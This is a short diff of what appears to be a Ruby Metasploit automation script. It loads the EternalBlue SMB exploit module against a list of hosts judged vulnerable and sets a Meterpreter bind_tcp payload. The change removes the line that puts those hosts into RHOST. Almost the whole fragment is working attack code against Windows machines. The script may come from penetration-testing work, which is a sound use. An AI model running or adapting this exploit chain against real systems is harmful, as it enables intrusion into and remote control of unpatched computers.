@@ -37,7 +37,7 @@ vulnerable_hosts = a.map{|i| all_hosts[i]}
 
 #exploit vulnerable hosts
 run_single("use exploit/windows/smb/ms17_010_eternalblue")
-run_single("set RHOST #{vulnerable_hosts.join(' ')}")
+
 
 #meterpreter session to run script
 run_single("set payload windows/x64/meterpreter/bind_tcp")
